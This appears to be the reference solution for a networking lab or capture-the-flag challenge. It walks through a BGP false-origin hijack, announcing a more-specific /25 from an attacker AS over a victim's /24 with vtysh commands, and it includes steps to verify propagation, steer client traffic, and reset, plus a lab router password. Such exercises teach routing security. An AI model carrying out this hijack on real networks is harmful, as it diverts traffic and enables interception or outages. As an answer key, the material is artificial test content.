# Reference solution: false-origin via more-specific

The win turns on longest-prefix match. The victim announces a /24. If you
announce a /25 covering the half of the address space the target service sits
in, every router prefers your /25 for those addresses, because a more-specific
route always beats a less-specific one regardless of AS_PATH length or policy.
With both transits filtering nothing, your /25 propagates unchallenged.

## Steps

1. Confirm the clean baseline from the collector. The victim's /24 is present,
   originated by 65010, and there is no /25:

       ./ctl table
       ./ctl lg | grep -A3 '203.0.113'

2. Drop into your foothold and announce the more-specific:

       ./ctl vtysh attacker-as

       configure terminal
       ip route 203.0.113.0/25 Null0
       router bgp 65020
        address-family ipv4 unicast
         network 203.0.113.0/25
        exit-address-family
       end

   203.0.113.0/25 is not connected on your router, so the discard
   (`ip route ... Null0`) goes in first: it puts the prefix in the RIB so the
   `network` statement has something to advertise. Do not `write memory`: keep
   the change in the running config only, so `./ctl down && ./ctl up` restores a
   clean baseline from the pristine bind-mounted config.

   (Via `./ctl vtysh attacker-as` you are already in enable mode. Over plain SSH
   as `admin`, run `enable` first, password `idsl-router`.)

3. Confirm propagation from the collector. You want a path for 203.0.113.0/25
   whose origin AS is 65020:

       ./ctl lg
       docker exec clab-inter-domain-gamemaster vtysh -c "show ip bgp 203.0.113.0/25 json"

4. Data-plane bonus. From the eyeball client, the more-specific now steers the
   request to you:

       docker exec -it clab-inter-domain-eyeball curl -s http://203.0.113.10/

   Serve your own content from attacker-as to make the flip observable (stand up
   a listener on 203.0.113.10 inside your AS, or route that address to a host you
   control). Propagation alone already scores the flag.

## Cleanup / reset

       ./ctl vtysh attacker-as
       configure terminal
       router bgp 65020
        address-family ipv4 unicast
         no network 203.0.113.0/25
       end
       no ip route 203.0.113.0/25 Null0

Or just `./ctl down && ./ctl up` for a clean table.